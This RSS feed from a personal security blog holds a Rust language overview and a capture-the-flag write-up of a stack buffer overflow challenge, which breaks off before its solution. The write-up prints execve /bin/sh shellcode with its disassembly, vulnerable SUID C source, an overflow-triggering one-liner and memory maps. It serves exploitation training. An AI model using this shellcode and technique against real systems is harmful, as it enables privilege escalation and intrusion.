<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Security on Mike&#39;s Blog</title>
    <link>https://michael-myers.github.io/blog/tags/security/index.xml</link>
    <description>Recent content in Security on Mike&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <atom:link href="https://michael-myers.github.io/blog/tags/security/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>A Look at the Rust Programming Language</title>
      <link>https://michael-myers.github.io/blog/post/a-tour-of-rust/</link>
      <pubDate>Mon, 27 Feb 2017 13:06:16 -0500</pubDate>
      
      <guid>https://michael-myers.github.io/blog/post/a-tour-of-rust/</guid>
      <description>

&lt;h2 id=&#34;where-to-find-more-execution-performance&#34;&gt;Where to Find More Execution Performance&lt;/h2&gt;

&lt;p&gt;Moore&amp;rsquo;s Law &lt;a href=&#34;http://fortune.com/2017/01/05/intel-ces-2017-moore-law/&#34;&gt;is just about done&lt;/a&gt;. It once described a trend of transistor count doubling every 24 months (enabled by increasing the density of transistors by making them ever-smaller). Now:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Between the introduction of 65 nm and 45 nm chips, about 23 months passed. To get from 45 nm to 32 nm took about 27 months, 28 months to go down from there to 22 nm and 30 months to shrink to the current 14 nm process. And that&amp;rsquo;s where Intel has been stuck since September 2014.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Intel &lt;em&gt;might&lt;/em&gt; release 10nm scale chips in late 2017, which would mean that they worked 36-40 months in order to shrink from 14nm to 10nm scale. In other words, the most recent density doubling (the shrink from 22nm to 10nm), by the time it happens, will have taken over 5 years. The next doubling is likely to take at least that long, assuming the multiple breakthroughs required to do so can even be achieved. 10nm is already fairly close to the atomic scale: ~45 silicon &lt;em&gt;atoms&lt;/em&gt; across (one atom: 0.22nm). One of the obstacles at this scale to be addressed is &lt;a href=&#34;https://en.wikipedia.org/wiki/Quantum_tunnelling&#34;&gt;quantum tunneling&lt;/a&gt;, not that I pretend to understand it.&lt;/p&gt;

&lt;p&gt;Of course, Moore&amp;rsquo;s Law can be satisfied one other way without changing density, which is to simply use bigger and bigger processor dies. You may have seen charts showing that transistor &lt;em&gt;count&lt;/em&gt; continues to increase on schedule with Moore&amp;rsquo;s Law, but this is only true for dedicated GPUs and high-end server CPUs, which are already up against cost practicality limits due to these die sizes.&lt;/p&gt;

&lt;p&gt;Even if we were still on track for Moore&amp;rsquo;s Law, increasing transistor counts alone have &lt;a href=&#34;https://cartesianproduct.wordpress.com/2013/04/15/the-end-of-dennard-scaling/&#34;&gt;provided diminishing returns as of late&lt;/a&gt;. Recent density increases have mainly just served to reduce power draw and to make more space on the CPU die dedicated to graphics rendering (an ideal parallelizable task). Tech being an optimistic culture makes it slow to acknowledge the obvious truth here: CPU &lt;em&gt;cores&lt;/em&gt; aren&amp;rsquo;t getting significantly faster. Unless your work is on a mobile device or can be delegated to a GPU or server farm, your only performance upgrades since 2010 have been I/O-related ones.&lt;/p&gt;

&lt;p&gt;Granted, transistor density improvements have continued to increase CPU power efficiency. But I have a Intel &amp;ldquo;Core i7&amp;rdquo; (2.66 GHz i7-620M, 2-core) laptop that will turn 7 years old in a couple of months, and today&amp;rsquo;s equivalent CPUs &lt;em&gt;still&lt;/em&gt; offer only a marginal performance improvement for tasks that aren&amp;rsquo;t 3D graphics. The equivalent CPU today, the Intel &amp;ldquo;Core i7&amp;rdquo; (2.7GHz i7-7500U, 2-core), has single-threaded performance only about 60% better than my CPU from 7 years ago. Not enough to make me throw out my old laptop.&lt;/p&gt;

&lt;p&gt;All of this background is to make my point, which is that the next performance leap has to come from improved software, rather than relying on &amp;ldquo;free&amp;rdquo; improvements from new hardware. A few software methods for achieving a generational improvement in performance might be:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Parallelism&lt;/li&gt;
&lt;li&gt;Optimizing compilers&lt;/li&gt;
&lt;li&gt;Moving tasks from interpreted languages back to compiled languages&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;All of these things are already happening, but it&amp;rsquo;s the last one that I&amp;rsquo;m interested in most.&lt;/p&gt;

&lt;h2 id=&#34;parallelism&#34;&gt;Parallelism&lt;/h2&gt;

&lt;p&gt;Parallelism has brought great performance improvements in graphics, &amp;ldquo;AI,&amp;rdquo; and large data set processing (so-called &amp;ldquo;Big Data&amp;rdquo;), and is the reason why GPUs &lt;a href=&#34;https://en.wikipedia.org/wiki/Transistor_count#GPUs&#34;&gt;continue to march forward in transistor count&lt;/a&gt; (although, again, check out those increasing die sizes; those are approaching their own limits of practicality). The problem with parallelism, though, is that while there are some workloads that are naturally suited to it, others aren&amp;rsquo;t and never will be. Sometimes, computing Task B is dependent on the outcome of Task A, and there is just no way to split up Task A. Even when parts of a task &lt;em&gt;can&lt;/em&gt; be parallelized, there are swiftly diminishing returns to adding more cores, as described &lt;a href=&#34;https://en.wikipedia.org/wiki/Amdahl%27s_law&#34;&gt;by Amdahl&amp;rsquo;s Law&lt;/a&gt;. What parallelized processing &lt;em&gt;does&lt;/em&gt; scale well for &lt;a href=&#34;https://en.wikipedia.org/wiki/Gustafson%27s_law&#34;&gt;is large data sets&lt;/a&gt;, although the home user is not typically handling large data sets, and won&amp;rsquo;t directly benefit from this kind of parallelism.&lt;/p&gt;

&lt;h2 id=&#34;optimizing-compilers&#34;&gt;Optimizing Compilers&lt;/h2&gt;

&lt;p&gt;Here are &lt;a href=&#34;https://cr.yp.to/talks/2015.04.16/slides-djb-20150416-a4.pdf&#34;&gt;Daniel J Bernstein&amp;rsquo;s 2015 slides&lt;/a&gt; about the death of &amp;ldquo;optimizing compilers,&amp;rdquo; or rather, that despite all the hype about them, we are still manually tuning the performance critical portions of our programs. The optimizing compilers&amp;rsquo; optimization of non-critical code portions is irrelevant, or at least not worth the effort put into optimizing compilers. It appears that a compiler to generically optimize any code as well as an expert human could, would require something like a &lt;a href=&#34;https://en.wikipedia.org/wiki/Artificial_general_intelligence&#34;&gt;general AI&lt;/a&gt; with a full contextual understanding of the problem being solved by the code. Such a thing doesn&amp;rsquo;t exist, and is not on the horizon.&lt;/p&gt;

&lt;h2 id=&#34;better-safer-compiled-languages&#34;&gt;Better (Safer) Compiled Languages&lt;/h2&gt;

&lt;p&gt;C and C++ never really left us, and neither have all of the inherent memory errors in code programmed in C and C++. That includes Java, whose runtime is still written in C. The Java runtime has been the source of many &amp;ldquo;Java&amp;rdquo; security issues over the years, to the point where the Java plug-in was effectively banned from all web browsers. Despite that, the rest of the browser is also written in C and C++, and just as prone to these problems. There hasn&amp;rsquo;t been any viable alternative but to try to sandbox and privilege-reduce the browser, because any safer language is too slow.&lt;/p&gt;

&lt;p&gt;The real cost of C and C++ &amp;rsquo;s performance is their high maintenance burdens: coding in them means always opening up subtle concurrency errors, memory corruption bugs, and information leak vulnerabilities. This is why simply improving the C++ standard library and adding more and more features to the language has not altered its basic value proposition to developers, who have already fled to &amp;ldquo;safe&amp;rdquo; languages.&lt;/p&gt;

&lt;p&gt;That&amp;rsquo;s where the experimental language, Rust, comes in. It&amp;rsquo;s a compiled systems programming language with performance on par with (&lt;a href=&#34;http://benchmarksgame.alioth.debian.org/u64q/which-programs-are-fastest.html&#34;&gt;or better than&lt;/a&gt;) C++, but with compile-time restrictions on memory management and concurrency that should prevent entire classes of bugs. At some point in the next 5 years, I predict that we will see Rust (or something like it, whether it&amp;rsquo;s &lt;a href=&#34;https://en.wikipedia.org/wiki/Swift_(programming_language)&#34;&gt;Swift&lt;/a&gt; or some new really strict C++ compiler) slowly start replacing C/C++ wherever performance and security are both primary concerns. It&amp;rsquo;s exciting to think that a well-designed compiled language could solve most of the reasons for the ~20-year flight away from native code programming.&lt;/p&gt;

&lt;p&gt;Having played with Rust for a few days, I can say it will certainly not replace Python for &lt;em&gt;ease&lt;/em&gt; of development, but it&amp;rsquo;s a really interesting disruptor for anyone writing native code. Security researchers should also take notice.&lt;/p&gt;

&lt;h2 id=&#34;rust-programming-language&#34;&gt;Rust Programming Language&lt;/h2&gt;

&lt;p&gt;For what it&amp;rsquo;s worth, Rust was the ‚ÄúMost Loved Programming Language of 2016 in the Stack Overflow Developer Survey.‚Äù It enforces memory management and safety at compile-time. Some memory safety features of the language include:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Rust does not permit null pointers or dangling pointers. Since pointers are never NULL, you can always safely dereference a pointer.&lt;/li&gt;
&lt;li&gt;There are no ‚Äúvoid‚Äù pointers.&lt;/li&gt;
&lt;li&gt;Pointers can not be downcast to a more specific type, only upcast to a more generic type. If generic data structures are needed, you use parameterized types/functions.&lt;/li&gt;
&lt;li&gt;Variables can be allocated on the heap and are cleaned up without the need for ‚Äúfree‚Äù or ‚Äúdelete.‚Äù&lt;/li&gt;
&lt;li&gt;There can be only one pointer pointing to an allocation, and it is passed back and forth between ‚Äúowners‚Äù such that concurrent access race conditions are impossible.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If you just wanted a statically typed, compiled language with a modern standard library that is easy to extend, you could also choose Go. But Rust claims to be all of that, plus faster and safer. Rust will work in embedded devices and other spaces currently occupied by C/C++; Go will not. &lt;a href=&#34;http://yager.io/programming/go.html&#34;&gt;Some think Rust is just fundamentally better&lt;/a&gt;, but I am not qualified to judge that.&lt;/p&gt;

&lt;h3 id=&#34;rust-and-parallelism&#34;&gt;Rust and parallelism&lt;/h3&gt;

&lt;p&gt;Rust makes parallelization an integral part of the language, with support for all of the necessary parallel programming primitives. Parallelized versions of various programming constructs can be swapped in without changing your existing code. This is possible because the Rust language forces the programmer to specify more about how data will be used, which prevents race conditions at runtime by turning them into errors at compile time, instead.&lt;/p&gt;

&lt;h3 id=&#34;concept-of-ownership-in-rust&#34;&gt;Concept of &amp;ldquo;Ownership&amp;rdquo; in Rust&lt;/h3&gt;

&lt;p&gt;The major innovation of the Rust language (inspired by a prior language, &amp;ldquo;Cyclone&amp;rdquo;) is that its compiler, in order to do memory management and prevent race conditions at compile time, tracks &amp;ldquo;ownership&amp;rdquo; of all variables in the code. Once a variable is used (like in a call to a function) it is considered to be passed to a new &amp;ldquo;owner,&amp;rdquo; and using it in a subsequent statement is illegal and would trigger a compiler error. If the developer&amp;rsquo;s intention was to copy-on-use (&amp;ldquo;clone&amp;rdquo;), they must specify that in their code. For certain simple data types (integers, etc.), they are automatically copied-on-use without any explicit intent from the developer. Another aspect of ownership in Rust is that all variables are (what in C/C++ would be called) &lt;code&gt;const&lt;/code&gt;, by default. In Rust, if you want a variable to be mutable, it has to be explicitly stated in the declaration.&lt;/p&gt;

&lt;p&gt;This concept is the foundation of the Rust language. It&amp;rsquo;s hard to grasp at first, since it is very different from programming in C or C++, or even Java. The most detailed explanation of Rust ownership that I&amp;rsquo;ve seen is &lt;a href=&#34;https://chrismorgan.info/blog/rust-ownership-the-hard-way.html&#34;&gt;this article by Chris Morgan&lt;/a&gt;, but to actually learn the concept I&amp;rsquo;d recommend starting with &lt;a href=&#34;http://intorust.com/tutorial/ownership/&#34;&gt;this 25 minute video by Nikolas Matsakis&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;At first, it seems like another mental burden on the programmer, but adopting this concept of memory management means the programmer is also &lt;em&gt;relieved&lt;/em&gt; of having to manage memory with carefully paired calls to &lt;code&gt;malloc()&lt;/code&gt; and &lt;code&gt;free()&lt;/code&gt; (or &lt;code&gt;new&lt;/code&gt; and &lt;code&gt;delete&lt;/code&gt;). &amp;ldquo;So what, isn&amp;rsquo;t this what you get with C# or Java?&amp;rdquo; Not quite: those languages use a Garbage Collector to track references to data at &lt;em&gt;runtime&lt;/em&gt;, which has an inherent performance overhead and whose &amp;ldquo;stop-the-world&amp;rdquo; resource management can be &lt;a href=&#34;http://stackoverflow.com/questions/16695874/why-does-the-jvm-full-gc-need-to-stop-the-world&#34;&gt;inconsistent and unpredictable&lt;/a&gt;. Rust does it in the language, at compile time. &lt;em&gt;So, without the use of a Garbage Collector, Rust makes memory management (and concurrent access to data) safe again.&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&#34;rust-is-a-drop-in-replacement-for-c&#34;&gt;Rust is a Drop-In Replacement for C&lt;/h3&gt;

&lt;p&gt;Just like C/C++, Rust can &lt;a href=&#34;https://blog.sentry.io/2016/10/19/fixing-python-performance-with-rust&#34;&gt;be coupled to Python or any other language with a native interface, in order to leverage the strengths of both&lt;/a&gt;. And, debugging Rust programs is officially &lt;a href=&#34;https://www.mail-archive.com/info-gnu@gnu.org/msg02192.html&#34;&gt;supported by GDB&lt;/a&gt;. This works the other way around too, i.e., you can build a Rust program on top of native code libraries written in C/C++. Mozilla is even working on &lt;a href=&#34;https://servo.org&#34;&gt;a web browser engine in Rust&lt;/a&gt;, to replace Gecko, the Firefox engine. &lt;a href=&#34;https://www.phoronix.com/scan.php?page=news_item&amp;amp;px=MTgzNDA&#34;&gt;Benchmarks in 2014&lt;/a&gt; showed a 300% increase in performance vs Gecko, and by early 2016, it was &lt;a href=&#34;https://www.phoronix.com/scan.php?page=news_item&amp;amp;px=Google-Servo-Perf-Comparison&#34;&gt;beating Webkit and Chrome as well&lt;/a&gt; (at least in some hand-picked benchmarks where they leverage Rust&amp;rsquo;s ease of parallelism to delegate a bunch of stuff to the GPU). If you&amp;rsquo;re interested in the details of how Rust can improve browser engines, Mozilla &lt;a href=&#34;https://arxiv.org/pdf/1505.07383v1.pdf&#34;&gt;wrote about it here&lt;/a&gt;. Buried in the paper is a detail that they seem to have downplayed elsewhere, though: the new browser engine is actually still bootstrapped by an existing codebase, so it&amp;rsquo;s still 75% C/C++ code. On the other hand, that also goes to show how Rust integrates well with C/C++.&lt;/p&gt;

&lt;h3 id=&#34;rust-has-a-package-manager-which-is-also-its-build-tool&#34;&gt;Rust has a Package Manager, which is also its Build Tool&lt;/h3&gt;

&lt;p&gt;Makefiles are impossible to write and debug, and basically you&amp;rsquo;re always just copy-pasting a previous Makefile into the new one, or hoping an IDE or build tool abstracts away all that crap for you, which is why &lt;a href=&#34;https://en.wikipedia.org/wiki/List_of_build_automation_software&#34;&gt;this wheel has been reinvented many times&lt;/a&gt;. I generally don&amp;rsquo;t have a favorite build tool (they&amp;rsquo;re all bad), since it always seems to come down to a manual troubleshooting cycle of acquiring all the right dependencies. The worst is having a build system that is a big layer cake of scripts on top of XML on top of Makefiles.&lt;/p&gt;

&lt;p&gt;Rust package manager &amp;ldquo;Cargo&amp;rdquo; simply uses TOML files to describe what a Rust project needs in order to build, and when you build with Cargo, it just goes out and gets those dependencies for you. Plus, the packages are served from Cargo.io, so if you&amp;rsquo;re keeping score that&amp;rsquo;s a double tech hipster bonus for using both the .io domain &lt;em&gt;and&lt;/em&gt; TOML.&lt;/p&gt;

&lt;h2 id=&#34;installation-and-hello-world&#34;&gt;Installation and Hello World&lt;/h2&gt;

&lt;p&gt;Assuming you&amp;rsquo;re using MacOS like me (there is plenty of info out there already for Windows and Linux users) and you have Homebrew:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    $ brew install rust
    $ rustc --version
    rustc 1.15.0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You probably want an editor with Rust syntax highlighting and code completion. &lt;a href=&#34;https://areweideyet.com&#34;&gt;These are your choices&lt;/a&gt;. I went with Visual Studio Code, aka VS Code. It&amp;rsquo;s not what I&amp;rsquo;d call an IDE, and I still haven&amp;rsquo;t gotten it to integrate with a debugger, but hopefully JetBrains will step up and make a Rust IDE ‚Äì once there is a market for it.&lt;/p&gt;

&lt;p&gt;VS Code doesn&amp;rsquo;t understand Rust out of the box. Launching VS Code, hit Command-P to open the in-app console:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ext install vscode-rust
(install the top search result, should be the extension by kalitaalexey)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Optionally, you can install a GDB/LLDB integration layer to attempt to debug from VS Code (in theory ‚Äì YMMV but I haven&amp;rsquo;t gotten it to work for LLDB with C++ yet, let alone Rust):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ext install webfreak.debug
(install the top search result)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Notice in the bottom right: ‚ÄúRust tools are missing‚Äù ‚Ä¶ click install. It will invoke Cargo (the Rust package manager) to download, compile, and install more of the Rust toolchain for you: racer, rustfmt, rustsym, etc. And all of the dependencies for those. Go have a coffee, this will take a while. About 18 minutes on my system.&lt;/p&gt;

&lt;p&gt;Finally: close VS Code, and open up Terminal so we can put all these new Rust binaries on your $PATH.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ open -a /Applications/TextEdit.app ~/.bash_profile
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Add the line &lt;code&gt;export PATH=&amp;quot;/Users/yourusername/.cargo/bin:$PATH&amp;quot;&lt;/code&gt; and save.&lt;/p&gt;

&lt;p&gt;Open a new instance of VS Code. It should no longer tell you that Rust tools are missing. üëçüèª&lt;/p&gt;

&lt;p&gt;Test the environment with a Hello World in Rust! Save the following as hello.rs:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-rust&#34;&gt;fn main() {
    println!(&amp;quot;Hello World!&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Open &amp;ldquo;View -&amp;gt; Integrated Terminal.&amp;rdquo; From here you can compile by hand like a peasant, because VS Code isn‚Äôt an actual IDE.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;bash-3.2$ cd ~/Desktop
bash-3.2$ rustc hello.rs
bash-3.2$ ./hello
Hello World!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But for a realistic scenario, we could have also used Cargo to both create a new Rust project and then build it.&lt;/p&gt;

&lt;p&gt;In a future post, I will share my thoughts on what it&amp;rsquo;s like to try to actually write a program in Rust.&lt;/p&gt;

&lt;h2 id=&#34;rust-references&#34;&gt;Rust References&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://rustbyexample.com/index.html&#34;&gt;Rust by Example&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://doc.rust-lang.org/book/README.html&#34;&gt;The Rust Programming Language&lt;/a&gt; (free e-book)&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Enigma2017 CTF Overflowme Writeup</title>
      <link>https://michael-myers.github.io/blog/post/enigma2017-overflowme-writeup/</link>
      <pubDate>Sun, 12 Feb 2017 17:52:54 -0500</pubDate>
      
      <guid>https://michael-myers.github.io/blog/post/enigma2017-overflowme-writeup/</guid>
      <description>

&lt;p&gt;As mentioned in my last post, I spent some time solving security challenges posted on HackCenter for the Enigma2017 conference. This one (obviously) was to exploit a buffer overflow vulnerability. It was meant to be relatively easy, but sometimes you don&amp;rsquo;t realize the easiest approach first. I&amp;rsquo;ll walk through not just the solution, but the things I tried that &lt;em&gt;didn&amp;rsquo;t&lt;/em&gt; work. It was a refresher course in exploitation for me ‚Äì I&amp;rsquo;ve spent many years on defense research and needed to brush up again. I know that this is a fast walkthrough, but I don&amp;rsquo;t want to try to teach every concept here, since it is a rather basic exercise, and many others have already explained them elsewhere. If you&amp;rsquo;re reading and would like clarification, feel free to hit me up on Twitter.&lt;/p&gt;

&lt;h2 id=&#34;the-challenge&#34;&gt;The Challenge&lt;/h2&gt;

&lt;p&gt;They provided a web shell (literally a terminal emulator in your browser, at HackCenter.com) to a Linux host, and they even gave some free shellcode, &lt;code&gt;\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80&lt;/code&gt;. You can disassemble this several ways, but a fast and easy way is &lt;a href=&#34;https://alexaltea.github.io/capstone.js/&#34;&gt;someone else&amp;rsquo;s server running Capstone.js&lt;/a&gt;. We observe that it is an &lt;code&gt;execve&lt;/code&gt; syscall at the end, and apparently is running &lt;code&gt;/bin/sh&lt;/code&gt; to provide a shell. We already &lt;em&gt;have&lt;/em&gt; a shell, so there must be something different about this target process they want us to exploit.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;    31 C0   xor eax, eax                # eax = NULL
    F7 E9   imul ecx
    50      push eax                    # the NULL that terminates the string
    68 2F 2F 73 68  push 0x68732f2f     # not a pointer! The string: ‚Äúh//sh‚Äù
    68 2F 62 69 6E  push 0x6e69622f     # not a pointer! The string: ‚Äúh/bin‚Äù
    89 E3   mov ebx, esp
    50      push eax                    # the NULL that terminates the string
    68 2D 69 69 69  push 0x6969692d     # the string ‚Äúh-iii‚Äù
    89 E6   mov esi, esp
    50      push eax                    # arguments
    56      push esi                    #	  to
    53      push ebx                    #		execve()
    89 E1   mov ecx, esp
    B0 0B   mov al, 0xb                 # the code number for execve()
    CD 80   int 0x80                    # syscall()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now let&amp;rsquo;s take a look at the shell we are given:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ uname -a
Linux enigma2017 3.16.0-4-amd64 #1 SMP Debian 3.16.39-1 (2016-12-30) x86_64 GNU/Linux
$ pwd
/problems/9ae8cc98f274aa6de77715eb9bdea7ed
$ ls -la
total 24                     
drwxr-xr-x  2 root       root         4096 Jan 27 16:07 .
drwxr-x--x 89 root       root         4096 Jan 27 16:07 ..
-r--r-----  1 hacksports overflowme_0   33 Jan 31 18:57 key
-rwxr-sr-x  1 hacksports overflowme_0 6088 Jan 31 18:57 overflowme
-rw-rw-r--  1 hacksports hacksports    530 Jan 31 18:57 overflowme.c
$ id
uid=1883(myname) gid=1884(myname) groups=1884(myname),1001(competitors)
$ checksec --file overflowme
# ...weirdly, checksec never returns, a bug in HackCenter maybe...
$ cat /proc/sys/kernel/randomize_va_space
2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Notice the permissions for the &lt;code&gt;overlowme&lt;/code&gt; binary include the &lt;a href=&#34;https://en.wikipedia.org/wiki/Setuid&#34;&gt;SUID access right flag&lt;/a&gt;. When you run this binary, it runs as the user &lt;code&gt;hacksports&lt;/code&gt;, who is the owner of &lt;code&gt;key&lt;/code&gt; and can read it. The goal here is to run arbitrary code in this process and use it to read &lt;code&gt;key&lt;/code&gt;. The given shellcode, executed by &lt;code&gt;overflowme&lt;/code&gt;, would provide us a shell where we have the ability to read &lt;code&gt;key&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Notice also the last command, which reads out the ASLR setting: 2. That means that we should expect the OS to randomize the layout of the program&amp;rsquo;s memory when it runs (both text &lt;em&gt;and&lt;/em&gt; data segments, is what 2 means).&lt;/p&gt;

&lt;p&gt;What about the source code they&amp;rsquo;re letting us see?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;quot;inspection.h&amp;quot;

void vuln(char *str) {
    char buf[979];
    sprintf(buf, &amp;quot;Hello %s&amp;quot;, str);
    puts(buf);
    fflush(stdout);
    return;
}

void be_nice_to_people(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int main(int argc, char **argv) {

    if (argc != 2) {
        printf(&amp;quot;Usage: %s [name]\n&amp;quot;, argv[0]);
        return 1;
    }

    be_nice_to_people();
    vuln(argv[1]);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;the-vulnerability&#34;&gt;The Vulnerability&lt;/h2&gt;

&lt;p&gt;This is a stack-based buffer overflow in the sprintf() call. A fixed-length buffer, &lt;code&gt;buf[979]&lt;/code&gt; takes a user input of unchecked (and unlimited) length, in the program&amp;rsquo;s first command-line argument. Since &lt;code&gt;buf&lt;/code&gt; is on the stack (as it is a local variable to the function &lt;code&gt;vuln&lt;/code&gt;), this is a stack-based buffer overflow.&lt;/p&gt;

&lt;p&gt;There are many, many guides out there that explain what happens when you overflow a stack-based buffer on a program that was compiled with absolutely no exploit mitigations: your input overwrites the saved return pointer (also on the stack), and the function epilogue&amp;rsquo;s &lt;code&gt;RET&lt;/code&gt; instruction transfers code execution to the address that is now part of the overflowed input. So, the attacker decides where execution will go: arbitrary code execution.&lt;/p&gt;

&lt;p&gt;Proof of the vulnerability:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ ./overflowme `perl -e &#39;print &amp;quot;\x30&amp;quot;x982&#39;`
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;or if you prefer Python:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ ./overflowme `python -c &#39;print &amp;quot;\x30&amp;quot;*982&#39;`
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;the-exploitation&#34;&gt;The Exploitation&lt;/h2&gt;

&lt;p&gt;Successful exploitation in a real-world scenario would require multiple prerequisite steps, but this is a simplified exploitaiton case. We just need to solve a few things.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Determine the offset in the attack input at which it overwrites the stored return pointer. These bytes have to point to where execution should go.&lt;/li&gt;
&lt;li&gt;In order to complete step 1, determine the address where execution should go.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Let&amp;rsquo;s start with the 2nd thing. Check the process memory map by launching it under GDB and using ProcFS:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) start
(gdb) shell ps
# ... observe the PID of overflowme, it is 32687
(gdb) shell cat /proc/32687/maps
08048000-08049000 r-xp 00000000 ca:02 2490631     /problems/9ae8cc98f274aa6de77715eb9bdea7ed/overflowme
08049000-0804a000 rwxp 00000000 ca:02 2490631     /problems/9ae8cc98f274aa6de77715eb9bdea7ed/overflowme
f7570000-f7571000 rwxp 00000000 00:00 0
f7571000-f7718000 r-xp 00000000 ca:02 786437      /lib32/libc-2.19.so
f7718000-f771a000 r-xp 001a7000 ca:02 786437      /lib32/libc-2.19.so
f771a000-f771b000 rwxp 001a9000 ca:02 786437      /lib32/libc-2.19.so
f771b000-f771f000 rwxp 00000000 00:00 0
f772a000-f772b000 rwxp 00000000 00:00 0
f772b000-f772c000 r-xp 00000000 00:00 0           [vdso]
f772c000-f772e000 r--p 00000000 00:00 0           [vvar]
f772e000-f774e000 r-xp 00000000 ca:02 786434      /lib32/ld-2.19.so
f774e000-f774f000 r-xp 0001f000 ca:02 786434      /lib32/ld-2.19.so
f774f000-f7750000 rwxp 00020000 ca:02 786434      /lib32/ld-2.19.so
fff84000-fffa5000 rwxp 00000000 00:00 0           [stack]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The last memory range, &lt;code&gt;[stack]&lt;/code&gt; is executable. You would not see this anymore these days, but this makes exploitation easier, it means shellcode in the buffer overflow input itself can run where it exists, directly. So we just need to check where the buffer is on the stack and put the address into the buffer and we&amp;rsquo;re good to go?&lt;/p&gt;

&lt;p&gt;Well hold on. Recall that we saw ASLR was enabled in the OS. Let&amp;rsquo;s run it another time and see these maps again.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;08048000-08049000 r-xp 00000000 ca:02 2490631   /problems/9ae8cc98f274aa6de77715eb9bdea7ed/overflowme           
08049000-0804a000 rwxp 00000000 ca:02 2490631   /problems/9ae8cc98f274aa6de77715eb9bdea7ed/overflowme
f75fd000-f75fe000 rwxp 00000000 00:00 0
f75fe000-f77a5000 r-xp 00000000 ca:02 786437    /lib32/libc-2.19.so
f77a5000-f77a7000 r-xp 001a7000 ca:02 786437    /lib32/libc-2.19.so    
f77a7000-f77a8000 rwxp 001a9000 ca:02 786437    /lib32/libc-2.19.so
f77a8000-f77ac000 rwxp 00000000 00:00 0
f77b7000-f77b8000 rwxp 00000000 00:00 0
f77b8000-f77b9000 r-xp 00000000 00:00 0         [vdso]
f77b9000-f77bb000 r--p 00000000 00:00 0         [vvar]
f77bb000-f77db000 r-xp 00000000 ca:02 786434    /lib32/ld-2.19.so
f77db000-f77dc000 r-xp 0001f000 ca:02 786434    /lib32/ld-2.19.so
f77dc000-f77dd000 rwxp 00020000 ca:02 786434    /lib32/ld-2.19.so
ffb9d000-ffbbe000 rwxp 00000000 00:00 0         [stack]  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;See that the stack is at a different address. The OS has applied ASLR to the data segments and the shared libraries for &lt;code&gt;libc&lt;/code&gt; and &lt;code&gt;ld&lt;/code&gt;. However, the entirety of the program binary itself has not moved. That is, apparently &lt;code&gt;overflowme&lt;/code&gt; was not even compiled with support for ASLR. Cool!&lt;/p&gt;

&lt;p&gt;Our shellcode is on the stack though, and the stack is one of the parts of memory that is moving around on every run. But that&amp;rsquo;s what we need a pointer to! Our only hope, then, is to find an instruction somewhere in the static mappings that jumps execution back to the stack. &lt;em&gt;Note: here is where I tried a number of unnecessary and fruitless solutions, thinking about this like a modern exploit developer (ROP gadgets, trampolines, etc.). If you just want to read the solution, skip to the next section where I &amp;ldquo;Phone a Friend.&amp;rdquo;&lt;/em&gt;&lt;/p&gt;

